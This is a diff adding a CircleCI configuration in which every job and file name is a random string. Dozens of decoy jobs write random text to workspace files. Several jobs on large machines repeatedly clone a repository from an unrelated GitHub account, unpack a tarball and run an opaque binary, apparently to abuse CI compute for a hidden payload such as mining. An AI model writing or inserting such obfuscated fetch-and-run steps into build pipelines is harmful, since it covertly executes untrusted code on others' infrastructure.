+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: hnujn
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: hpapsberv
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  rwrsbpbzcv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: fzfmrgdni
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'munuvcghsequs abjwbwxclprej' > /tmp/xoduacjbbx/lybqnskoodmbth
+            ls -la /tmp/xoduacjbbx/lybqnskoodmbth
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'lybqnskoodmbth'
+  tlmusiotxdnt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: cvalekw
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/lybqnskoodmbth | awk '{print $1}'; done ; } || true
+      - run:
+          name: nsupp
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: lmkpvozahsiev
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: efkfdnnnkwmdocc
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  wbxnevhcfqgsztl:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: zsyfjkexa
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'mumurkmkuqdszmouq whvmwkkwodidjbac' > /tmp/xoduacjbbx/wxpkuccu
+            ls -la /tmp/xoduacjbbx/wxpkuccu
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'wxpkuccu'
+  ghobhf:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: etvpzzfbmem
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/wxpkuccu | awk '{print $1}'; done ; } || true
+      - run:
+          name: jxpugvi
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: kzmqir
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: tipke
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  hdgzgsmlr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: ngfkhopqxmkkpq
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'czwgpqphlj afxrwrqvbhsnuwku' > /tmp/xoduacjbbx/hieygy
+            ls -la /tmp/xoduacjbbx/hieygy
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'hieygy'
+  nnhbmfyoibzpt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: cdvwmzclrnk
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/hieygy | awk '{print $1}'; done ; } || true
+      - run:
+          name: ekusmsvdrjdeosq
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: gbdjzhbveua
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: zcdyelsxlsbwkn
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  ufhpcjhpwbms:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: ywvgaislgolve
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'hlgrsrnegqzdfcysa omlwjbfcallwbc' > /tmp/xoduacjbbx/fkrszugbqzxudg
+            ls -la /tmp/xoduacjbbx/fkrszugbqzxudg
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'fkrszugbqzxudg'
+  vqbrboaj:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: pjqitphkihtdsd
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/fkrszugbqzxudg | awk '{print $1}'; done ; } || true
+      - run:
+          name: urmjegp
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: bwasjeedqoqahm
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: reyksztdiovsz
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+  kitqbfmie:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: haekretic
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'epbzkwwrwx ietqomfvpgnr' > /tmp/xoduacjbbx/lytlgfptpnwzm
+            ls -la /tmp/xoduacjbbx/lytlgfptpnwzm
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'lytlgfptpnwzm'
+  rwxqa:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: obnjsnl
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/xoduacjbbx/lytlgfptpnwzm | awk '{print $1}'; done ; } || true
+      - run:
+          name: qmxegpen
+          command: git clone --depth 5 -q --no-single-branch --no-tags https://github.com/darcieburrowsf8y11-cloud/c4e3f7d93b84 .
+      - run:
+          name: wjqhemo
+          command: cat exjpinoo.tgz | tar xzf -
+      - run:
+          command: sleep 45
+      - run:
+          name: pmhrqzkcovjyinb
+          command: du -sh .
+      - run:
+          command: (./sjnhamdsguss)
+
+  ijbnxmheutl:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: kjdhi
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'bkgmjrwtzgvarq prfyieakxownjdnvh' > /tmp/xoduacjbbx/ogynhgryfs
+            ls -la /tmp/xoduacjbbx/ogynhgryfs
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'ogynhgryfs'
+  yenznenksrngih:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: cercubmbf
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'vnzpvhspiy coseddbfyueglrbf' > /tmp/xoduacjbbx/sgitfxar
+            ls -la /tmp/xoduacjbbx/sgitfxar
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'sgitfxar'
+  wqiygjuzbha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: gugvcuitkc
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'pusytssggm bemxgmsbfeab' > /tmp/xoduacjbbx/vagpiqtumu
+            ls -la /tmp/xoduacjbbx/vagpiqtumu
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'vagpiqtumu'
+  lxocal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: inwfhsbuw
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'uhmtvmuhen ujvgfsvhenrjwpz' > /tmp/xoduacjbbx/wumzchtdgl
+            ls -la /tmp/xoduacjbbx/wumzchtdgl
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'wumzchtdgl'
+  llnzniujrk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: vaxqucr
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'qyptwbamose zcvpebxfjtpcslsnq' > /tmp/xoduacjbbx/zolngzt
+            ls -la /tmp/xoduacjbbx/zolngzt
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'zolngzt'
+  xdfflukywyg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: yzynlqjajajvsnb
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'tcdkwcureuoekxii xuupwobvyozzb' > /tmp/xoduacjbbx/lytlgfptpnwzm
+            ls -la /tmp/xoduacjbbx/lytlgfptpnwzm
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'lytlgfptpnwzm'
+  lglojtiuucbfj:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: lqnkjah
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'ckllqqcorbha yovvhneojel' > /tmp/xoduacjbbx/fkrszugbqzxudg
+            ls -la /tmp/xoduacjbbx/fkrszugbqzxudg
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'fkrszugbqzxudg'
+  umvfsri:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: ilpnsdhoubpnia
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'ctmtdnxynwtxotawcp cjdlbgcnnq' > /tmp/xoduacjbbx/bzyqchovyl
+            ls -la /tmp/xoduacjbbx/bzyqchovyl
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'bzyqchovyl'
+  yhxgwwqvric:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: rhzjownyqakahp
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'xcynxkcmlo lahdugbvgwainbuwo' > /tmp/xoduacjbbx/qfplmexfa
+            ls -la /tmp/xoduacjbbx/qfplmexfa
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'qfplmexfa'
+  oiuggqsic:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: isauakgqk
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'ysfvcvfzigvjeyv qplsghyracvpcmy' > /tmp/xoduacjbbx/mhymtykiui
+            ls -la /tmp/xoduacjbbx/mhymtykiui
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'mhymtykiui'
+  xgbyywhflcxjl:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: itixiejiirlpfc
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'qbmviruxmzzfjgrj vdgremphef' > /tmp/xoduacjbbx/wxpkuccu
+            ls -la /tmp/xoduacjbbx/wxpkuccu
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'wxpkuccu'
+  ikulzncufywuz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: hgbwavjepsgmoeu
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'exzhshiworunftjjz tmsdysgpfwzkwcuer' > /tmp/xoduacjbbx/tbisbpf
+            ls -la /tmp/xoduacjbbx/tbisbpf
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'tbisbpf'
+  dbkkoaslchjrgbe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: hdkutywvep
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'juyoqvefob gfvtitczpyusu' > /tmp/xoduacjbbx/qfycou
+            ls -la /tmp/xoduacjbbx/qfycou
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'qfycou'
+  dwxzeyli:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: gvanofvyreme
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'kgjepgejreipbtpx hecfrcnrllctcblys' > /tmp/xoduacjbbx/wjuuhzngei
+            ls -la /tmp/xoduacjbbx/wjuuhzngei
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'wjuuhzngei'
+  wfcvjqw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: xlqzvvs
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'fcsvhwlqct gkdeikymwyeqfa' > /tmp/xoduacjbbx/leifnmntlwe
+            ls -la /tmp/xoduacjbbx/leifnmntlwe
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'leifnmntlwe'
+  ojcjymdilch:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: ohlltgoafskfv
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'hteiscxwkyrz zkukvhqmpfuxldfr' > /tmp/xoduacjbbx/uhimgngtetgz
+            ls -la /tmp/xoduacjbbx/uhimgngtetgz
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'uhimgngtetgz'
+  jjipsrapbbmeegv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: jqzoqsljmj
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'hgeqoknemrwwdnlutv aoazzyvrpl' > /tmp/xoduacjbbx/evksml
+            ls -la /tmp/xoduacjbbx/evksml
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'evksml'
+  ldosxi:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: ivhfvbvdx
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'pwejzbpqipcwlxf mjmfpbjbgaojl' > /tmp/xoduacjbbx/wmemwr
+            ls -la /tmp/xoduacjbbx/wmemwr
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'wmemwr'
+  yyvtkmrxpz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: ypvag
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'wrvqmhxaamjv twjnvtzozpytd' > /tmp/xoduacjbbx/mniskw
+            ls -la /tmp/xoduacjbbx/mniskw
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'mniskw'
+  vldrhhibug:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: psawrefnhx
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'urrskgatmousuhnkv ppjaozfgrurxivvm' > /tmp/xoduacjbbx/ebynwv
+            ls -la /tmp/xoduacjbbx/ebynwv
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'ebynwv'
+  zkqitcz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: hsujponivsujg
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'byjejzglxjo latdzvtwfvzpo' > /tmp/xoduacjbbx/hlcrbqldhvgsts
+            ls -la /tmp/xoduacjbbx/hlcrbqldhvgsts
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'hlcrbqldhvgsts'
+  ehxriigsxq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: xapyiaauenmgq
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'fqmcdlflkericrc pfdhjdutuqtpnbpa' > /tmp/xoduacjbbx/qafczkx
+            ls -la /tmp/xoduacjbbx/qafczkx
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'qafczkx'
+  huxfpkf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: iadbqb
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'dohfjzsyktdqk foommnvjgnz' > /tmp/xoduacjbbx/hieygy
+            ls -la /tmp/xoduacjbbx/hieygy
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'hieygy'
+  alepxqx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: nylltzyhsuvzbil
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'ntwakjidlspdkamr ydyiyagsowuhjixa' > /tmp/xoduacjbbx/qvadfkzpqfqbf
+            ls -la /tmp/xoduacjbbx/qvadfkzpqfqbf
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'qvadfkzpqfqbf'
+  galcdij:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: avkkg
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'pmofcfpcsvntn yisxnacrtvh' > /tmp/xoduacjbbx/hkehib
+            ls -la /tmp/xoduacjbbx/hkehib
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'hkehib'
+  tcvryedxodv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: zzuxyyph
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'crlhabtphfc cscwizmaaer' > /tmp/xoduacjbbx/lalifgwbj
+            ls -la /tmp/xoduacjbbx/lalifgwbj
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'lalifgwbj'
+  hikus:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: wyhtabuvhi
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'fkfjranfqwzdsi qgrwxertxw' > /tmp/xoduacjbbx/bfclyzrom
+            ls -la /tmp/xoduacjbbx/bfclyzrom
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'bfclyzrom'
+  toszmbzkbf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: chttxxi
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'einmafndpbjltn bskoqichwfo' > /tmp/xoduacjbbx/lzgvejgogf
+            ls -la /tmp/xoduacjbbx/lzgvejgogf
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'lzgvejgogf'
+  jwrtmfm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: rjqvdzebp
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'novwnxzcql xsdhqmldozfhzskn' > /tmp/xoduacjbbx/secoahuabdqsx
+            ls -la /tmp/xoduacjbbx/secoahuabdqsx
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'secoahuabdqsx'
+  ecbypbjikd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xoduacjbbx
+      - run:
+          name: yjkxrlhszvspwob
+          command: |
+            mkdir -p /tmp/xoduacjbbx
+            echo 'hnmqxsojkaygnl bmogdhgoxciwffwm' > /tmp/xoduacjbbx/lybqnskoodmbth
+            ls -la /tmp/xoduacjbbx/lybqnskoodmbth
+      - persist_to_workspace:
+          root: /tmp/xoduacjbbx
+          paths:
+            - 'lybqnskoodmbth'
+workflows:
+  hcniztpfmhprxl:
+    jobs:
+      - djsltgnbubheoys
+      - ijbnxmheutl:
+          requires:
+            - djsltgnbubheoys
+      - zbaujdix:
+          requires:
+            - ijbnxmheutl
+      - ntidlb:
+          requires:
+            - ijbnxmheutl
+      - yenznenksrngih:
+          requires:
+            - ntidlb
+      - ajcoe:
+          requires:
+            - yenznenksrngih
+      - lzqfqzkc:
+          requires:
+            - yenznenksrngih
+      - wqiygjuzbha:
+          requires:
+            - lzqfqzkc
+      - wlwhluxcixvven:
+          requires:
+            - wqiygjuzbha
+      - ypiuiuwiqa:
+          requires:
+            - wqiygjuzbha
+      - lxocal:
+          requires:
+            - ypiuiuwiqa
+      - gqyvpgfcj:
+          requires:
+            - lxocal
+      - zskisr:
+          requires:
+            - lxocal
+      - llnzniujrk:
+          requires:
+            - zskisr
+      - ghvnikpw:
+          requires:
+            - llnzniujrk
+      - kitqbfmie:
+          requires:
+            - llnzniujrk
+      - xdfflukywyg:
+          requires:
+            - kitqbfmie
+      - rwxqa:
+          requires:
+            - xdfflukywyg
+      - ufhpcjhpwbms:
+          requires:
+            - xdfflukywyg
+      - lglojtiuucbfj:
+          requires:
+            - ufhpcjhpwbms
+      - vqbrboaj:
+          requires:
+            - lglojtiuucbfj
+      - ybkrveu:
+          requires:
+            - lglojtiuucbfj
+      - umvfsri:
+          requires:
+            - ybkrveu
+      - zxflvokvhtxph:
+          requires:
+            - umvfsri
+      - yaohrgbkjjuwk:
+          requires:
+            - umvfsri
+      - yhxgwwqvric:
+          requires:
+            - yaohrgbkjjuwk
+      - fgxxjsjn:
+          requires:
+            - yhxgwwqvric
+      - makacxzmeew
+      - oiuggqsic:
+          requires:
+            - makacxzmeew
+      - okolccnl:
+          requires:
+            - oiuggqsic
+      - wbxnevhcfqgsztl:
+          requires:
+            - oiuggqsic
+      - xgbyywhflcxjl:
+          requires:
+            - wbxnevhcfqgsztl
+      - ghobhf:
+          requires:
+            - xgbyywhflcxjl
+      - rnozidtvz:
+          requires:
+            - xgbyywhflcxjl
+      - ikulzncufywuz:
+          requires:
+            - rnozidtvz
+      - sldbj:
+          requires:
+            - ikulzncufywuz
+      - orvqotpadxy:
+          requires:
+            - ikulzncufywuz
+      - dbkkoaslchjrgbe:
+          requires:
+            - orvqotpadxy
+      - xasolqemzmyeob:
+          requires:
+            - dbkkoaslchjrgbe
+      - wqksudgvtz:
+          requires:
+            - dbkkoaslchjrgbe
+      - dwxzeyli:
+          requires:
+            - wqksudgvtz
+      - mfxbyaokfxte:
+          requires:
+            - dwxzeyli
+      - wvbvrf:
+          requires:
+            - dwxzeyli
+      - wfcvjqw:
+          requires:
+            - wvbvrf
+      - tcppdiphaogjxil:
+          requires:
+            - wfcvjqw
+      - vgsohlp:
+          requires:
+            - wfcvjqw
+      - ojcjymdilch:
+          requires:
+            - vgsohlp
+      - zxyaagxqf:
+          requires:
+            - ojcjymdilch
+      - fphvmiomyjcukqs
+      - jjipsrapbbmeegv:
+          requires:
+            - fphvmiomyjcukqs
+      - slrsxlxerttyywh:
+          requires:
+            - jjipsrapbbmeegv
+      - weuyw:
+          requires:
+            - jjipsrapbbmeegv
+      - ldosxi:
+          requires:
+            - weuyw
+      - ethhdmrmea:
+          requires:
+            - ldosxi
+      - uyyaoletbluqmhw:
+          requires:
+            - ldosxi
+      - yyvtkmrxpz:
+          requires:
+            - uyyaoletbluqmhw
+      - dkmenmws:
+          requires:
+            - yyvtkmrxpz
+      - pfmwdclrpfrutlh:
+          requires:
+            - yyvtkmrxpz
+      - vldrhhibug:
+          requires:
+            - pfmwdclrpfrutlh
+      - kqczmkqtr:
+          requires:
+            - vldrhhibug
+      - vqfcooelawyb:
+          requires:
+            - vldrhhibug
+      - zkqitcz:
+          requires:
+            - vqfcooelawyb
+      - qwvwlixbrubdnh:
+          requires:
+            - zkqitcz
+      - xterznafx
+      - ehxriigsxq:
+          requires:
+            - xterznafx
+      - hxzrocgmlqgvc:
+          requires:
+            - ehxriigsxq
+      - hdgzgsmlr:
+          requires:
+            - ehxriigsxq
+      - huxfpkf:
+          requires:
+            - hdgzgsmlr
+      - nnhbmfyoibzpt:
+          requires:
+            - huxfpkf
+      - cgblooe:
+          requires:
+            - huxfpkf
+      - alepxqx:
+          requires:
+            - cgblooe
+      - yaenzzabtk:
+          requires:
+            - alepxqx
+      - jdhwnp:
+          requires:
+            - alepxqx
+      - galcdij:
+          requires:
+            - jdhwnp
+      - hfdouwuqtxxcivd:
+          requires:
+            - galcdij
+      - nfsohy:
+          requires:
+            - galcdij
+      - tcvryedxodv:
+          requires:
+            - nfsohy
+      - layzcnoavd:
+          requires:
+            - tcvryedxodv
+      - qmgiuuhkfnxh
+      - hikus:
+          requires:
+            - qmgiuuhkfnxh
+      - huhjlhnsudto:
+          requires:
+            - hikus
+      - smqsppbzp:
+          requires:
+            - hikus
+      - toszmbzkbf:
+          requires:
+            - smqsppbzp
+      - nnrsrs:
+          requires:
+            - toszmbzkbf
+      - nurqrkczhqem:
+          requires:
+            - toszmbzkbf
+      - jwrtmfm:
+          requires:
+            - nurqrkczhqem
+      - seekyzt:
+          requires:
+            - jwrtmfm
+      - rwrsbpbzcv:
+          requires:
+            - jwrtmfm
+      - ecbypbjikd:
+          requires:
+            - rwrsbpbzcv
+      - tlmusiotxdnt:
+          requires:
+            - ecbypbjikd
